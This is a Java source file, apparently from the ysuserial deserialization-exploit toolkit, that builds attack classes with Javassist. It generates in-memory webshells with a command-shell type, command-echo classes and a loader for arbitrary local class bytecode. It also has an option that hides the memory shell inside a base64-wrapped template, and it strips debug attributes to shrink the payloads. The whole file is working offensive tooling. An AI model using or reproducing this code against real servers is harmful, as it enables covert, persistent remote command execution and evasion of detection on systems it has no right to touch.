package org.su18.ysuserial.payloads.handle;

import javassist.CtClass;
import javassist.bytecode.*;
import org.apache.commons.codec.binary.Base64;
import org.su18.ysuserial.payloads.util.Gadgets;

import java.io.FileInputStream;
import java.util.List;

import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.*;
import static org.su18.ysuserial.payloads.handle.ClassMethodHandler.*;
import static org.su18.ysuserial.payloads.handle.ClassNameHandler.*;
import static org.su18.ysuserial.payloads.util.Utils.*;

/**
 * @author su18
 */
public class GlassHandler {


	public static CtClass generateClass(String target) throws Exception {
		String  newClassName = generateClassName();
		CtClass ctClass      = generateClass(target, newClassName);

		// 如果需要，保存类文件
		saveCtClassToFile(ctClass);
		return ctClass;
	}


	public static CtClass generateClass(String target, String newClassName) throws Exception {
		if (target.startsWith("EX-")) {
			target = target.substring(3);

			// 内存马类型
			String shellType     = "";
			String memShellName  = "";
			Class  memShellClazz = null;

			// 如果命令以 MS 开头，则代表是注入内存马
			if (target.startsWith("MS-")) {
				target = target.substring(3);

				if (target.contains("-")) {
					String[] commands = target.split("[-]");
					memShellName = commands[0];
					shellType = target.substring(target.indexOf("-") + 1);
				} else {
					memShellName = target;
					shellType = "cmd";
				}
			} else {
				// 否则是回显类，或者其他功能
				memShellName = target;
			}

			String result = searchClassByName(memShellName);
			if (result != null) {
				memShellClazz = Class.forName(result, false, Gadgets.class.getClassLoader());
			} else {
				throw new IllegalArgumentException("Input Error,Please Check Your MemShell Name!");
			}

			return generateClass(memShellClazz, shellType, newClassName);
		}

		// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
		if (target.startsWith("LF-")) {
			target = target.substring(3);
			String  filePath = target.contains("-") ? target.split("[-]")[0] : target;
			CtClass ctClass  = POOL.makeClass(new FileInputStream(filePath));
			ctClass.setName(newClassName);

			// 对本地加载的类进行缩短操作
			shrinkBytes(ctClass);

			// 使用 ClassLoaderTemplate 进行加载
			return encapsulationByClassLoaderTemplate(ctClass.toBytecode(), newClassName);
		}

		return null;
	}

	public static CtClass generateClass(Class clazz, String shellType, String newClassName) throws Exception {

		CtClass ctClass   = null;
		byte[]  byteCodes = null;

		String exClassName = clazz.getName();
		ctClass = POOL.get(exClassName);

		// 为 Echo 类添加 CMD_HEADER_STRING
		insertFieldIfExists(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");

		// 为 DefineClassFromParameter 添加自定义函数功能
		insertFieldIfExists(ctClass, "parameter", "public static String parameter = " + converString(PARAMETER) + ";");

		// 为内存马添加名称
		insertFieldIfExists(ctClass, "NAME", "public static String NAME=" + converString(getHumanName(newClassName, "Filter")) + ";");

		// 为内存马添加地址
		insertFieldIfExists(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");

		// 根据不同的内存马类型，插入不同的方法、属性
		insertKeyMethodByClassName(ctClass, exClassName, shellType);

		// 为类设置新的类名
		ctClass.setName(newClassName);

		// 为 Struts2ActionMS 额外处理，防止框架找不到的情况
		insertFieldIfExists(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(ctClass.toBytecode()) + "\";");

		shrinkBytes(ctClass);
		byteCodes = ctClass.toBytecode();

		if (HIDE_MEMORY_SHELL) {
			switch (HIDE_MEMORY_SHELL_TYPE) {
				case 1:
					break;
				case 2:
					CtClass newClass = POOL.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
					newClass.setName(generateClassName());
					String content = "b64=\"" + Base64.encodeBase64String(byteCodes) + "\";";
					String cName = "className=\"" + ctClass.getName() + "\";";
					newClass.defrost();
					newClass.makeClassInitializer().insertBefore(content);
					newClass.makeClassInitializer().insertBefore(cName);

					ctClass = newClass;
					break;
			}
		}

		return ctClass;
	}


	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
	public static void shrinkBytes(CtClass ctClass) {
		ClassFile classFile = ctClass.getClassFile2();
		classFile.removeAttribute(SourceFileAttribute.tag);
		classFile.removeAttribute(LineNumberAttribute.tag);
		classFile.removeAttribute(LocalVariableAttribute.tag);
		classFile.removeAttribute(LocalVariableAttribute.typeTag);
		classFile.removeAttribute(DeprecatedAttribute.tag);
		classFile.removeAttribute(SignatureAttribute.tag);
		classFile.removeAttribute(StackMapTable.tag);

		List<MethodInfo> list = classFile.getMethods();
		for (MethodInfo info : list) {
			info.removeAttribute("RuntimeVisibleAnnotations");
			info.removeAttribute("RuntimeInvisibleAnnotations");
		}
	}

}
